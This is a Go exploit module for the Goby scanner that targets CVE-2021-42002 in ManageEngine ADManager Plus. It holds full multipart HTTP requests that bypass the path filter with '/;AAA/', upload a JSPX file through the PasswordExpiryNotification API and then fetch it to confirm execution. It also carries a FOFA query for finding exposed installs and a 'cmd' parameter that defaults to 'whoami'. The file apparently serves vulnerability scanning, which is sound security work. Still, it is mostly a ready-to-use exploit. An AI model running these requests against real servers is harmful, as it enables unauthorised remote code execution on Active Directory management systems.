package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ManageEngine ADManager Plus PasswordExpiryNotification Api File upload Vulnerability (CVE-2021-42002)",
    "Description": "<p>ManageEngine ADManager Plus is An Active Directory (AD) management and reporting solution that allows IT administrators and technicians to manage AD objects easily and generate instant reports at the click of a button!</p><p>ManageEngine ADManager Plus &lt;7114 Filter bypass leading to file-upload remote code execution,this vulnerability has been fixed and released in version 7115</p>",
    "Impact": "<p>ManageEngine ADManager Plus File upload vulnerability(CVE-2021-42002)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:https://www.manageengine.com/products/ad-manager/release-notes.html#7115</p>",
    "Product": "ManageEngine ADManager Plus",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "ManageEngine ADManager Plus PasswordExpiryNotification 接口任意文件上传漏洞（CVE-2021-42002）",
            "Product": "ManageEngine ADManager Plus",
            "Description": "<p>ManageEngine ADManager Plus 是Zoho公司开发的一个 Active Directory (AD) 管理和报告解决方案，它允许 IT 管理员和技术人员轻松管理 AD 对象并单击按钮生成即时报告！</p><p>ManageEngine ADManager Plus 存在权限绕过漏洞，导致未授权用户允许上传JSPX文件至网站目录，达到任意代码执行目的。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.manageengine.com/products/ad-manager/release-notes.html#7115\">https://www.manageengine.com/products/ad-manager/release-notes.html#7115</a></p>",
            "Impact": "<p>攻击者通过权限绕过直接上传木马jspx文件，可远程执行任意系统命令获取服务器权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "ManageEngine ADManager Plus PasswordExpiryNotification Api File upload Vulnerability (CVE-2021-42002)",
            "Product": "ManageEngine ADManager Plus",
            "Description": "<p><span style=\"color: rgb(68, 68, 68);\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">ManageEngine ADManager Plus is&nbsp;</span>An Active Directory (AD) management and reporting solution that allows IT administrators and technicians to manage AD objects easily and generate instant reports at the click of a button!<br></span></p><p><span style=\"color: rgb(68, 68, 68); font-size: medium;\">ManageEngine ADManager Plus &lt;7114 Filter bypass leading to file-upload remote code execution,this&nbsp;<span style=\"color: rgb(54, 71, 79);\">vulnerability has been fixed and released in version&nbsp;</span><strong style=\"color: rgb(54, 71, 79);\">7115</strong></span><br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">The vendor has released a bug fix, please pay attention to the update in time:<span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><a href=\"https://www.manageengine.com/products/ad-manager/release-notes.html#7115\">https://www.manageengine.com/products/ad-manager/release-notes.html#7115</a></span></span><br></p>",
            "Impact": "<p>ManageEngine ADManager Plus File upload vulnerability(CVE-2021-42002)</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "(title=\"ManageEngine - ADManager Plus\") || title=\"ManageEngine - ADManager Plus\"",
    "GobyQuery": "(title=\"ManageEngine - ADManager Plus\") || title=\"ManageEngine - ADManager Plus\"",
    "Author": "Flip_FI",
    "Homepage": "https://www.manageengine.com/",
    "DisclosureDate": "2021-11-11",
    "References": [
        "https://www.manageengine.com/products/ad-manager/release-notes.html#7115"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-42002"
    ],
    "CNVD": [
        "CNVD-2021-88234 "
    ],
    "CNNVD": [
        "CNNVD-202111-1073"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/;AAA/MobileAPI/WC/PasswordExpiryNotification?operation=fileAttachment",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=---------------------------18496892720832008743187564073"
                },
                "data_type": "text",
                "data": "-----------------------------18496892720832008743187564073\nContent-Disposition: form-data; name=\"UPLOADED_FILE\"; filename=\"1.jspx\"\r\nContent-Type: text/plain\r\n\r\n<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/jstl/core\" version=\"2.0\">\n<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>\n<jsp:directive.page import=\"java.util.*\"/>\n<jsp:directive.page import=\"java.io.*\"/>\n<jsp:scriptlet><![CDATA[\n\tout.println(\"c4ca4238a0b923820dcc509a6f75849b\");\n\t]]></jsp:scriptlet>\n</jsp:root>\r\n-----------------------------18496892720832008743187564073--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "SUCCESS",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "file|lastbody|regex|([0-9_.a-z]+.jspx)"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/ompemberapp/PasswordExpiryNotification/{{{file}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c4ca4238a0b923820dcc509a6f75849b",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/;AAA/MobileAPI/WC/PasswordExpiryNotification?operation=fileAttachment",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=---------------------------18496892720832008743187564073"
                },
                "data_type": "text",
                "data": "-----------------------------18496892720832008743187564073\nContent-Disposition: form-data; name=\"UPLOADED_FILE\"; filename=\"1.jspx\"\r\nContent-Type: text/plain\r\n\r\n<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/jstl/core\" version=\"2.0\">\n<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>\n<jsp:directive.page import=\"java.util.*\"/>\n<jsp:directive.page import=\"java.io.*\"/>\n<jsp:scriptlet><![CDATA[\n\tout.println(\"c4ca4238a0b923820dcc509a6f75849b\");\n\t]]></jsp:scriptlet>\n</jsp:root>\r\n-----------------------------18496892720832008743187564073--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "SUCCESS",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "file|lastbody|regex|([0-9_.a-z]+.jspx)"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/ompemberapp/PasswordExpiryNotification/{{{file}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c4ca4238a0b923820dcc509a6f75849b",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10358"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
